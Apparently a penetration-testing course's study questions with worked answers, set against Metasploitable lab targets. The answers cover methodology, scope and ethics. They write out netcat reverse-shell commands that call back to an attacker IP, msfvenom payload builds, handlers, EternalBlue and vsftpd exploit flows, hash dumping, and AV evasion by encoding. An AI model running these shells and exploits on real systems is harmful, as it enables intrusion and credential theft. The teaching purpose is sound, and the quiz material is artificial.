# 03. Penetration Testing — Simulated Open-Book Questions

### [EASY] You have just been handed a signed contract scoping a pentest, plus a list of in-scope IP ranges. Match each of these three actions to the correct step of the six-step methodology, and name the step that comes immediately before "Exploitation": (a) running `nmap` over the in-scope IPs, (b) writing the executive summary, (c) deciding which discovered services are likely vulnerable.

**Answer:** Map each action to the methodology in order (L03 p.8):

1. **(a) Running `nmap` over the in-scope IPs** → step 2, **Gathering information / reconnaissance** (scan IPs, enumerate hosts & services, fingerprint services).
2. **(c) Deciding which discovered services are likely vulnerable** → step 4, **Vulnerability analysis** (connecting collected intel to possible vulnerabilities).
3. **(b) Writing the executive summary** → step 6, **Reporting** (report and/or fix the problems).

The step that comes **immediately before Exploitation (step 5)** is **Vulnerability analysis (step 4)** (L03 p.8). The full order is: Getting permission → Gathering information → Threat modelling (scope) → Vulnerability analysis → Exploitation → Reporting.

### [EASY] During a Metasploit session a teammate sets `RHOSTS` to the Kali attacker's IP and `LHOST` to the Metasploitable target's IP, then complains the exploit "does nothing." In one or two sentences, explain what they got wrong and how to fix it.

**Answer:** They swapped the remote and local hosts. **R = remote = the target**, so `RHOSTS`/`RPORT` must be the Metasploitable target's IP/port; **L = local = the attacker**, so `LHOST`/`LPORT` must be the Kali machine's IP/port (L03 p.26). With the values reversed, the exploit aims at the attacker and the payload is told to call back to the victim, so nothing connects.

**Fix:** `set RHOSTS <Metasploitable_IP>` and `set LHOST <Kali_IP>`. Swapping R and L is the classic Metasploit mistake (L03 p.26, Gotchas).

### [EASY] You need to confirm which process is holding TCP port 8080 on a Linux host you can log into, and you only have a normal user account. Give the command, and state one limitation you will hit.

**Answer:** Use `lsof` scoped to the port (L03 p.13):

```
sudo lsof -i :8080
```

This lists the open socket on port 8080 and the owning process. Equivalent checks are `netstat -antp` or the modern `ss -at4n` (L03 p.13).

**Limitation:** Full socket/process information requires **administrative privileges**. As a normal user you may only see your own processes' sockets and will miss those owned by other users (hence the `sudo`) (L03 p.13).

### [EASY] An auxiliary scanner reports that a Metasploitable 2 host is running vsFTPd 2.3.4. Which Metasploit exploit module should you select, and is this Linux or Windows target?

**Answer:** Select the dedicated backdoor module (L03 p.28, p.31):

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

This is a **Linux** target (Metasploitable 2). The `unix/` path and the fact that vsFTPd 2.3.4's malicious build ships on the Linux target both confirm it (L03 p.28). vsFTPd 2.3.4 contained a hard-coded bind-shell backdoor, so this module is the right, vulnerability-specific choice — and exploits only work if the target actually has that vulnerability, which the scanner just confirmed (L03 p.28).

### [EASY] In a netcat reverse shell, which side runs `nc -lvnp <port>` (empty), and which side runs `nc <ip> <port> -e /bin/bash`?

**Answer:** In a reverse shell the victim connects *out* to the attacker (L03 p.17):

- **Attacker (e.g. Kali)** runs the **empty listener**: `nc -lvnp <port>`.
- **Victim** runs the connect-and-serve command: `nc <attacker_ip> <port> -e /bin/bash`.

The `-e /bin/bash` lives on whichever side *serves* the shell — here the victim. The attacker then types `whoami` / `id` into the listener to confirm the user context (L03 p.17). Contrast with a bind shell, where the *victim* listens with `-e /bin/bash` and the attacker connects in (L03 p.16).

### [MEDIUM] A target sits behind a corporate firewall that blocks all inbound connections but permits outbound TCP. You want a shell. Choose between a netcat bind shell and a reverse shell, give the exact commands for both sides, and justify the choice in terms of the firewall.

**Answer:** Choose a **reverse shell**. A bind shell requires the attacker to connect *inbound* to a port the victim is listening on, which the firewall blocks. A reverse shell has the **victim initiate the outbound connection**, which the firewall permits, so the session forms (L03 p.17).

**Commands:**

1. On the **attacker** (Kali), start an empty listener:
   ```
   nc -lvnp 4444
   ```
2. On the **victim**, connect back out and serve a shell:
   ```
   nc <attacker_ip> 4444 -e /bin/bash
   ```
3. Back on the attacker's listener, run `whoami` / `id` to confirm access (L03 p.17).

**Justification:** Reverse shells "punch out" through inbound firewalls and NAT precisely because the victim is the one originating the connection — the firewall sees ordinary outbound traffic, not an inbound connection to a listening service (L03 p.17, Gotchas). A bind shell would have its inbound listening port blocked.

### [MEDIUM] You generated a Windows reverse-TCP Meterpreter payload with `LHOST=10.0.0.5 LPORT=5555`. Write the `exploit/multi/handler` setup that will catch it, and explain what happens if you set `LPORT 4444` in the handler instead.

**Answer:** The handler must mirror the payload exactly (E03 p.5):

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 5555
run
```

The handler then listens on `10.0.0.5:5555` and waits for the incoming connection (E03 p.5).

**If you set `LPORT 4444` instead:** the payload was baked at generation time to call back to `10.0.0.5:5555`, so it dials port 5555. The handler is listening on 4444, so the victim's outbound connection never reaches the listener and **no session forms** (E03 p.5). The payload type, LHOST and LPORT in the handler must all match the values used at generation time; a port mismatch silently breaks the catch (Gotchas).

### [MEDIUM] An auxiliary VNC scan on Metasploitable 2 succeeds and prints a login password. Describe the two-phase scan-to-exploit flow and explain why the auxiliary module alone is not the "exploit."

**Answer:** The flow has a fingerprint/scan phase (auxiliary) followed by an access phase (L03 p.29–30):

1. **Scan (auxiliary):**
   ```
   use auxiliary/scanner/vnc/vnc_login
   set RHOSTS <target_ip>
   run
   ```
   The scanner brute-forces / validates VNC logins and reveals the working password.
2. **Exploit (gain access):** from Kali, launch the VNC client with the discovered credential:
   ```
   vncviewer <target_ip>
   ```
   Log in with the password the scanner reported — you are now inside the target's VNC session (L03 p.30).

**Why the auxiliary isn't the exploit:** auxiliary modules are scanners/fuzzers/sniffers that *gather information* about a target (L03 p.20, p.27). The `vnc_login` module only *discovers* a valid credential; it does not itself give you a session. Actually using that credential to log in via `vncviewer` is the exploitation step that turns information into access (L03 p.20, p.30).

### [MEDIUM] You must move a `payload.elf` from Kali to Metasploitable 2 using only netcat, then run it. Give the receiver and sender commands, in the right direction, and the two commands needed to execute the ELF afterward.

**Answer:** Use netcat file transfer, watching the redirection direction — `<` sends a file, `>` writes one (L03 p.18; E03 p.5):

1. On the **target (Metasploitable 2)** — receive and write to disk:
   ```
   nc -lvnp 4444 > payload.elf
   ```
   (The lab's variant has the receiver listening; the sender then connects.)
2. On the **sender (Kali)** — push the file:
   ```
   nc <target_ip> 4444 < payload.elf
   ```
3. On the target, make it executable and run it:
   ```
   chmod a+x payload.elf
   ./payload.elf
   ```

Mixing up `<` and `>` transfers nothing or overwrites the wrong file, and skipping `chmod a+x` means the ELF won't run (E03 p.5–6, Gotchas).

### [MEDIUM] You find a ready-made exploit for your target's service on exploit-db. State the specific risk the lecture warns about and the concrete precaution, then explain why fingerprinting the service first (with an auxiliary scanner) reduces wasted effort.

**Answer:** **Risk:** not all exploits found online do what they claim — some do *more* than advertised and can cause **further damage to the target** (L03 p.19). **Precaution:** read through the exploit code and understand exactly what it does before running it (L03 p.19). This matters doubly for a pentester whose job is to demonstrate a problem *without harming the target* (L03 p.8).

**Why fingerprint first:** exploit modules are **vulnerability-specific** — an exploit only works if the target actually has that exact vulnerability (L03 p.28). Running an auxiliary scanner (e.g. `ftp_version`, `smb_version`, `http_version`) first confirms the service and version, so you only fire exploits that can actually land instead of blindly trying modules that will fail or, worse, destabilize the target (L03 p.27–28).

### [HARD] You have a fresh Meterpreter session on a Metasploitable 2 Linux host as a low-privileged user. The rules of engagement require a risk-impact assessment but forbid disrupting the host. Lay out a post-exploitation plan: which post modules / Meterpreter actions you run, in what order, and what each tells you about impact.

**Answer:** Treat post-exploitation as a **risk-impact assessment** after obtaining the shell (E03 p.3). A sensible order moves from understanding context, to harvesting value, to gauging spread — all read-only/non-disruptive:

1. **Confirm context (who/where am I):** in the session use `getuid` / `id` and `sysinfo` to record the user context, privilege level and OS (E03 p.6). This frames everything else — a low-priv user limits what you can read.
2. **Detect defenses:** `run post/linux/gather/enum_protections` to check for IDS, sniffers and other protections (L03 p.34). Impact: tells you what would have caught a real attacker and constrains noisier actions.
3. **Map the network:** `run post/linux/gather/enum_network` (and Meterpreter IP/MAC, network-connection, and process listings) to learn the host's network position (L03 p.34–35). Impact: feeds the lateral-movement assessment.
4. **Harvest credentials / hashes:** `run post/linux/gather/hashdump` to dump password hashes (L03 p.34). Impact: cracked hashes enable lateral movement and demonstrate credential exposure — a high-severity finding.
5. **Locate sensitive files & persistence:** navigate the filesystem to find sensitive files and identify persistence mechanisms; note what data could be exfiltrated (E03 p.3).
6. **Assess lateral movement:** combine network map + harvested credentials to judge whether you could pivot to other hosts (E03 p.3).

**Staying within RoE:** every step above is information-gathering (enumeration, hashdump, file reads) rather than destructive — consistent with building a PoC that demonstrates the problem *without harming the target* (L03 p.8). You would avoid actions like killing processes or modifying system files.

### [HARD] Build the complete msfvenom-to-session flow for landing a Meterpreter shell on a Metasploitable 2 Linux box that can only make outbound connections. Include payload generation, the handler, simulated delivery, execution, and session verification. Attacker IP is 192.168.56.101, port 4444.

**Answer:** Because the target is outbound-only, use a **reverse_tcp** payload so the victim dials home (L03 p.17; E03 p.4–6):

1. **Generate the payload (Kali):**
   ```
   msfvenom -a x86 --platform linux -f elf \
     -p linux/x86/meterpreter/reverse_tcp \
     LHOST=192.168.56.101 LPORT=4444 \
     -o payload.elf
   ```
   `-a x86` architecture, `--platform linux`, `-f elf` output format, `-p` the reverse-TCP Meterpreter payload, `LHOST`/`LPORT` the attacker's call-back address (L03 p.37–38; E03 p.4).
2. **Start the catcher (Kali, msfconsole):**
   ```
   use exploit/multi/handler
   set payload linux/x86/meterpreter/reverse_tcp
   set LHOST 192.168.56.101
   set LPORT 4444
   run
   ```
   The handler must mirror the payload's type, LHOST and LPORT exactly (E03 p.5).
3. **Simulate delivery with netcat (lab substitutes for social engineering):** target `nc -lvnp 4444 < payload.elf` paired with sender `nc <target_ip> 4444 > payload.elf` — or the reverse direction — to move the file (E03 p.5). (Use a different port than the handler if reusing 4444 for transfer would clash.)
4. **Execute on the target:**
   ```
   chmod a+x payload.elf
   ./payload.elf
   ```
   The payload connects out to 192.168.56.101:4444, which the firewall permits (E03 p.5–6).
5. **Verify the session:** the handler reports a Meterpreter session; run `sysinfo` and `getuid` to confirm OS, user context and a live session, then explore environment, processes, credentials, filesystem and network (E03 p.6).

The unsolved real-world piece is getting the user to run the payload — delivery via deception is explicitly out of scope and faked with netcat here (L03 p.40; E03 p.6).

### [HARD] You scan a Metasploitable 3 Windows host and confirm SMB is exposed and unpatched. Choose the right exploit, give the msfconsole flow, state what session you expect, and then justify two post modules that specifically support the lab's "network RCE → credential compromise" requirement.

**Answer:** Unpatched SMB on a Windows target points to **EternalBlue (MS17-010)**, an SMB remote kernel-corruption exploit (L03 p.28, p.33).

**msfconsole flow (L03 p.33):**
```
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
exploit
```

**Expected session:** on success you land in a **Meterpreter session** (L03 p.33). This satisfies the lab's M3 "network-based RCE (e.g. SMB)" requirement (E03 p.3).

**Two post modules supporting credential compromise / impact:**
1. `run post/windows/gather/enum_logged_on_users` — lists logged-on users, identifying high-value accounts (e.g. an admin currently logged in) whose credentials are worth targeting; this feeds the "credential-based compromise" deliverable (L03 p.34; E03 p.3).
2. `run post/windows/gather/enum_applications` — enumerates installed applications, surfacing software that may store credentials or present further escalation paths; combined with the logged-on-user data it supports the risk-impact narrative (L03 p.34).

(`run post/windows/gather/checkvm` is also useful context — confirming the target is a VM — but it is environment reconnaissance rather than credential compromise, L03 p.34.) For evidence the lab wants the module used plus `getuid`/`whoami`, `ip a`, and a session screenshot (E03 p.3).

### [HARD] The lab requires you to exploit the vsFTPd 2.3.4 backdoor and explain the "why port 6200?" question, and separately to reproduce the same backdoor with only Nmap and Netcat. Walk through both the Metasploit path and the manual path, and explain the mechanism that makes 6200 the shell port.

**Answer:** **Metasploit path (L03 p.31–32):**
1. Fingerprint: `use auxiliary/scanner/ftp/ftp_version`, `set RHOSTS <target>`, `run` — confirm version 2.3.4.
2. Exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`, `set RHOSTS <target>`, `exploit`.
3. A (root) shell session opens on the target — but via **port 6200**, not the FTP port 21 (L03 p.31).

**Manual path with Nmap + Netcat (L03 p.32):** The lecture shows reproducing the attack with only those tools to demystify the backdoor. In practice you trigger the backdoor by connecting to FTP (port 21) and sending the malicious trigger username, then use Netcat to connect to the freshly opened shell on port 6200 (and Nmap to confirm 6200 is now listening). The point of the exercise is to understand the concept without a framework hiding the mechanics (L03 p.32).

**Why 6200?** vsFTPd 2.3.4 shipped with a malicious, **hard-coded bind-shell backdoor**: when the daemon receives a specific trigger username over FTP, it opens a root shell that **listens on TCP 6200** (E03 classifies this as a "Backdoored service" / "Hardcoded bind shell"). So the *trigger* arrives on port 21, but the *shell* is a bind shell on 6200 — which is exactly the "why?" the slide poses (L03 p.31; E03 p.2). Recognizing this distinction (trigger port vs. backdoor port) is the analytical payoff.

### [HARD] Two engineers are arguing. Engineer A says "our system passed last month's pentest, so it's secure and we don't need threat modelling in development." Engineer B disagrees. Using the chapter's framing of what a pentest is and is not — plus the survey evidence and the legal driver — settle the argument.

**Answer:** **Engineer B is right.** Three grounded points settle it:

1. **A pentest is not a guarantee of security.** Penetration testing is an authorized *simulated attack* on a *running* system; it is explicitly **not a guarantee of security** and is meant to **complement** a broader strategy, including threat modelling during development/deployment (L03 p.7). "Passed a pentest" therefore does not equal "secure" — a test covers a defined scope at a point in time and can miss what was out of scope or introduced later. Don't claim safety because a test passed (Gotchas).

2. **Survey evidence shows blind spots are the norm.** The Sophos / Vanson Bourne survey (3,100 IT managers, 12 countries) found 68% of companies were hit in 2023 and **1 in 5 did not know how the attacker got in**; 37% of threats were detected only at servers and another 37% on the network, meaning attackers had already been "snooping around" before discovery (L03 p.9). "You can't plug holes if you don't know where they are" — a single passed test does not eliminate unknown holes.

3. **Legal driver and continuity.** The EU NIS2 Directive *requires* certain organizations to perform penetration testing (L03 p.7) — framing it as an ongoing obligation, not a one-off certificate of safety. And the methodology starts from threat modelling/scope (L03 p.8), reinforcing that security work continues into development, not just at test time.

**Conclusion:** the pentest is a valuable but partial, point-in-time PoC of exploitable issues; dropping threat modelling in development because of one passed test misunderstands what a pentest is (L03 p.7–9).

### [VERY HARD] You are mid-engagement with a session on a host. You notice it has a second network interface on a subnet that is NOT listed in your signed scope, and you can clearly reach a database server there. The client's security lead, over chat, says "go ahead, hit it too, we want to know." Analyze whether to proceed, citing the methodology and the ethics framing, and describe the correct procedure.

**Answer:** **Do not proceed on the basis of a chat message — pause and get the scope amended in writing first.** Reasoning grounded in the chapter:

1. **Authorization defines white-hat status.** The very first methodology step is *getting permission*, and threat modelling defines *what the test covers* (scope) (L03 p.8). The out-of-scope subnet is, by definition, not authorized. The difference between a white hat and a grey hat is precisely permission: a white hat hacks *with* permission; a grey hat "usually obeys the law, but also hacks *without* permission" (L03 p.6). Attacking an unscoped system on an informal say-so drifts you from white-hat into grey-hat territory — and possibly black, depending on consequences.

2. **An informal "go ahead" is not rules-of-engagement.** Authorization is the formal step that makes testing legal and bounds it (L03 p.6, p.8, Gotchas: "Authorization first, always"). A chat message from one individual may not represent the asset owner's authority, may not cover that database's data, and leaves you legally exposed. Scope exists exactly to prevent "we said it was fine" disputes after damage.

3. **Ethics framing.** The lecture's ethical anchor is Kant's Categorical Imperative — act only on a maxim you could will to be universal law — and the observation that large systems run on **trust in privileged users**, whose breakdown is costly (L03 p.10–11). A norm of "pentesters expand scope on a verbal nudge" is not one you could universalize without eroding the trust the whole profession depends on. Even a contracted white hat must keep asking whether the action is genuinely ethical (L03 p.10).

4. **Don't-harm principle.** Exploitation must be a careful PoC that demonstrates the problem *without harming the target* (L03 p.8) — and you cannot vouch for the impact on an unscoped production database you have not analyzed.

**Correct procedure:**
1. Stop interacting with the out-of-scope subnet immediately; do not touch the database.
2. Document the finding (the reachable second interface and DB) as an observation — this itself is valuable (a network-segmentation / lateral-movement risk).
3. Request a **written scope amendment / change to the rules of engagement** from the proper authorizing party, covering the new IP range and the database, before any further action.
4. Only after written authorization, resume with the database in scope; otherwise report the reachability as a risk and leave it untested.

### [VERY HARD] Compare and contrast the netcat vsFTPd-style bind shell on port 6200 with a msfvenom reverse_tcp Meterpreter payload caught by multi/handler, across these axes: who initiates the connection, firewall/NAT behavior, what software must already exist on the target, and detectability. Then state which is more realistic for a modern external engagement and why.

**Answer:** **Axis-by-axis comparison:**

| Axis | vsFTPd bind shell (port 6200) | msfvenom reverse_tcp + multi/handler |
|---|---|---|
| Who initiates | **Attacker** connects *in* to the listening backdoor on 6200 (L03 p.31; bind direction, L03 p.16) | **Victim** connects *out* to the attacker's handler (reverse direction, L03 p.17; E03 p.5) |
| Firewall / NAT | Needs an **inbound** path to port 6200; blocked by inbound firewalls/NAT | "Punches out" through inbound firewalls/NAT because the victim originates the connection (L03 p.17) |
| Pre-existing software on target | Relies on the **already-installed backdoored vsFTPd 2.3.4 daemon**; no attacker code delivered — the vulnerability *is* the backdoor (L03 p.28, p.31) | Requires **delivering and executing** an attacker-built payload (`chmod a+x`, `./payload.elf`); nothing vulnerable need pre-exist, but the user must run it (E03 p.5–6) |
| Detectability | An unusual root shell listening on **6200** is conspicuous to a port scan/`netstat`; trigger arrives on 21 but shell is on 6200 — odd and noticeable (L03 p.31, Gotchas) | Blends into normal outbound traffic; payload can be **encoded with `-e` to evade AV/IDS** (L03 p.21, p.38), making it stealthier |

**Key conceptual contrasts:**
- The bind shell is **vulnerability-dependent**: it exists only because that exact backdoored build is present (exploits are vulnerability-specific, L03 p.28). The reverse payload is **vulnerability-independent** but **delivery-dependent**: it works on a clean target *if* the user executes it (L03 p.40).
- Direction drives the firewall story: bind = inbound (fragile against modern perimeters), reverse = outbound (resilient) (L03 p.16–17).

**Which is more realistic for a modern external engagement:** the **msfvenom reverse_tcp payload**. Modern targets sit behind inbound firewalls/NAT that block the bind shell's listening port, whereas a reverse connection rides permitted outbound traffic (L03 p.17). It also doesn't depend on finding a conveniently pre-backdoored 2003-era service. Its honest weakness — getting the victim to run the payload — is the *delivery* problem the lecture flags as the real unsolved step (social engineering, out of scope and deferred), but it is far more representative of real external attacks than relying on a hard-coded legacy backdoor (L03 p.40; E03 p.6).

### [VERY HARD] You scanned a Metasploitable 2 target and produced this finding table. Triage it for the lab's M2 minimums (1 backdoored service, 1 weak/default-credential, 1 RCE, 1 misconfiguration), assigning each row to a category, choosing a Metasploit module where the chapter gives one, and predicting which gives immediate root. Then name what is missing to meet all four minimums.

| Port | Service | Detail |
|---|---|---|
| 21 | vsftpd 2.3.4 | version-confirmed |
| 5900 | VNC | login scan returned a password |
| 80 | Apache/PHP-CGI | php-cgi reachable |

**Answer:** **Categorize and assign modules (E03 p.1–3):**

1. **Port 21 — vsftpd 2.3.4 → Backdoored service.** This is the lab's "Backdoored service / Hardcoded bind shell" category (E03 p.2). Module: `exploit/unix/ftp/vsftpd_234_backdoor` (L03 p.28). **Immediate root: yes** — the backdoor opens a root shell on port 6200, so this is the row most likely to give immediate root with no further escalation (L03 p.31).
2. **Port 5900 — VNC with a recovered password → Weak/default credentials.** The `auxiliary/scanner/vnc/vnc_login` scan already returned a usable password (L03 p.29). Access path: `vncviewer <target_ip>` and log in (L03 p.30). This satisfies the **weak/default-credential** minimum (E03 p.3). Immediate root: not guaranteed — depends on the VNC session's user.
3. **Port 80 — Apache / PHP-CGI → RCE.** Maps to remote code execution; module: `exploit/multi/http/php_cgi_arg_injection` (Apache HTTPd PHP-CGI argument injection) (L03 p.28). This satisfies the **RCE** minimum (E03 p.3). Whether it yields root depends on the web server's user context.

**Mapping to the four M2 minimums:** backdoored ✔ (vsftpd), weak/default-credential ✔ (VNC), RCE ✔ (php-cgi). **Missing: a misconfiguration finding.** Nothing in this table represents the **misconfiguration** category that M2 also requires (E03 p.3).

**What's missing / next step:** you must enumerate further to surface a misconfiguration (the lab lists categories such as misconfiguration and legacy insecure protocols, E03 p.1–2) — for example an anonymous-FTP misconfiguration (`auxiliary/scanner/ftp/anonymous`, L03 p.27), a world-readable share, or another insecure-default setting. Until you find and exploit one, you have only 3 of the 4 mandated M2 outcomes. For each success the lab also requires evidence: `whoami`, `ip a`, `id`/`getuid`, a session screenshot, the module used, and an attack-path explanation (E03 p.3).

### [VERY HARD] An exploit module gives you a Meterpreter session, but `getuid` shows a low-privileged service account, not root/SYSTEM. The client cares most about "what an attacker could ultimately reach." Design the rest of the engagement from here: escalation options the chapter mentions, how to translate findings into the executive report's required structure, and how the "don't harm the target" rule constrains you throughout.

**Answer:** **Situation:** you have access but as a low-privileged account (`getuid`), so impact is currently bounded; the question is how far an attacker could *ultimately* reach (E03 p.3, p.6).

**1. Escalate and assess reach (post-exploitation as risk-impact):**
- **Privilege escalation** is an explicit goal of *post* modules (privilege escalation, credential harvesting, data extraction) (L03 p.21). On Linux the chapter even names a local priv-esc exploit, `exploit/linux/local/sock_sendpage` (a Linux kernel flaw) (L03 p.28); the lab's M3 list mandates demonstrating a privilege escalation (E03 p.3).
- **Harvest credentials/hashes:** `post/linux/gather/hashdump` (or Windows equivalents) — cracked hashes may unlock higher-privileged or reusable accounts (L03 p.34).
- **Enumerate defenses and network:** `post/linux/gather/enum_protections` and `enum_network`, plus Meterpreter IP/MAC, connection and process listings, to map what else is reachable (L03 p.34–35).
- **Assess lateral movement:** combine the network map with harvested credentials to judge pivoting to other hosts — the lab's lateral-movement assessment, which directly answers "what could an attacker ultimately reach" (E03 p.3).

**2. Translate into the executive report's required structure (E03 p.3–4):**
- **1-page executive summary** in *business-impact* terms: e.g. "an attacker who lands as a service account can escalate to root via a known kernel flaw, dump hashes, and pivot to the database subnet — exposing customer data." Keep it non-technical and decision-oriented.
- **Technical write-up of ≥3 critical vulnerabilities**, each with: **root cause**, **high-level exploitation method**, **impact**, **CVE if applicable**, and **remediation** (E03 p.3–4). The low-priv-to-root chain (initial exploit + sock_sendpage escalation + hashdump) is a strong critical entry, documented with evidence (`getuid`, screenshots, module used, attack-path explanation, E03 p.3).

**3. How "don't harm the target" constrains every step:** exploitation must be a careful PoC that demonstrates the problem *without harming the target* (L03 p.8). That means:
- Prefer **enumeration/read** actions (hashdump, file reads, network mapping) over destructive ones; demonstrate escalation enough to *prove* it, not to damage the host.
- Be wary of **online/third-party priv-esc exploits** that may "do more than advertised" — read the code first (L03 p.19), since an unvetted kernel exploit could crash a production box.
- Keep all actions within the authorized scope set during threat modelling (L03 p.8); the goal is a credible impact narrative for the report, not maximal disruption.

The deliverable is therefore an evidence-backed *chain* — low-priv foothold → escalation → credential/data exposure → lateral-movement potential — presented at two altitudes (executive + technical) and obtained without harming the system (L03 p.8, p.21, p.34; E03 p.3–4).

### [VERY HARD] A junior pentester proposes this plan for a Metasploitable 3 Windows engagement: "I'll skip the auxiliary scanning to save time, grab the first EternalBlue exploit I find on exploit-db, set RHOSTS to my Kali IP, fire it, and if I get a shell I'll immediately run a privilege-escalation tool I downloaded to prove maximum impact." Identify every distinct error in this plan, ordered from most to least severe, and give the corrected approach for each.

**Answer:** The plan compounds several independent mistakes from the chapter. From most to least severe:

1. **No authorization/scope check is even mentioned (most severe).** The methodology *begins* with getting permission, and threat modelling sets scope (L03 p.8). Nothing here confirms the engagement is authorized or that EternalBlue's potentially destabilizing kernel exploit is in scope. **Correction:** confirm written authorization and that this exploit/technique is permitted before touching the target (L03 p.6, p.8).

2. **`RHOSTS` set to the Kali IP — fires at the attacker, not the target.** R = remote = target; the Kali box is the attacker (LHOST) (L03 p.26). The exploit would do nothing useful (the classic R/L mix-up). **Correction:** `set RHOSTS <Metasploitable3_target_IP>` and `set LHOST <Kali_IP>` (L03 p.26, p.33).

3. **Running an unvetted exploit-db exploit blindly.** Not all online exploits do what they claim; some do *more* and can damage the target (L03 p.19) — especially dangerous for a memory-corruption SMB exploit against a production-like host, and it conflicts with the "demonstrate without harming the target" rule (L03 p.8). **Correction:** read and understand the exploit code first; prefer the vetted Metasploit module `exploit/windows/smb/ms17_010_eternalblue` (L03 p.19, p.28).

4. **Skipping auxiliary scanning.** Exploits are vulnerability-specific and only work if the target actually has that vulnerability (L03 p.28). Firing EternalBlue without confirming SMB/MS17-010 wastes effort and risks crashing an unaffected service. **Correction:** fingerprint first, e.g. `use scanner/smb/smb_version` (and confirm the host is unpatched) before exploiting (L03 p.27–28).

5. **Immediately running a downloaded priv-esc tool "to prove maximum impact" (least severe but still wrong).** Same untrusted-code risk as (3), and "maximum impact" misframes the goal: post-exploitation is a careful *risk-impact assessment* built from read-oriented `post` modules (e.g. `enum_logged_on_users`, credential/hash harvesting), not maximal disruption (L03 p.21, p.34; E03 p.3). **Correction:** vet any escalation code, escalate only enough to *prove* the finding, and document evidence (`getuid`, screenshot, module used, attack-path explanation) for the report (E03 p.3).

**Net:** a correct flow is authorize/scope → auxiliary fingerprint (smb_version) → vetted EternalBlue module with `RHOSTS`=target and `LHOST`=Kali → Meterpreter session → careful read-based post-exploitation and evidence capture — none of which the junior's plan does correctly (L03 p.8, p.19, p.26–28, p.33–34; E03 p.3).
